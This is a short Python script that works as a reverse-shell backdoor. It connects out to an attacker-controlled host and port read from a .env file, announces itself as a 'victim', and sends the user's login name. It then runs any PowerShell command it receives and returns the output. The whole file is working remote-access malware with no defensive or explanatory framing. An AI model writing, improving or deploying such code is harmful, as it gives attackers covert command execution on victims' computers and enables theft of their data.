import os
import socket
import subprocess
import time
import os
from dotenv import load_dotenv

load_dotenv()

HOST = open(".env", "r+").read()
PORT = 21213



# OPEN THE CONNECTION
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Waiting in silent to connect !")
while True:
    try:
        sock.connect((HOST, PORT))
        break
    except TimeoutError:
        print("Connection timed out, trying again...")
        time.sleep(5)
        continue

print("Connected !")
time.sleep(0.2)
# sending welcome packet !
print("Sending welcome packet !")
sock.send(
    f"Hello I'm a victim and I like to share you information about me !\nMy name is: {os.getlogin()}".encode())

MAX_BYTE = 4 * 1024

while True:
    print("Waiting for cmd !")
    cmd = sock.recv(MAX_BYTE).decode()
    if cmd == "disconnect":
        sock.close()
        break

    if cmd == "pwshl":
        data = sock.recv(MAX_BYTE).decode()
        try:
            rtn = subprocess.check_output(f"powershell {data}", shell=True).decode("ansi")
        except subprocess.CalledProcessError:
            rtn = "Error executing command!"
        except:
            rtn = "An error in the command executer occurred !"
        print(f"CMD: {rtn}")
        sock.send(rtn.encode())
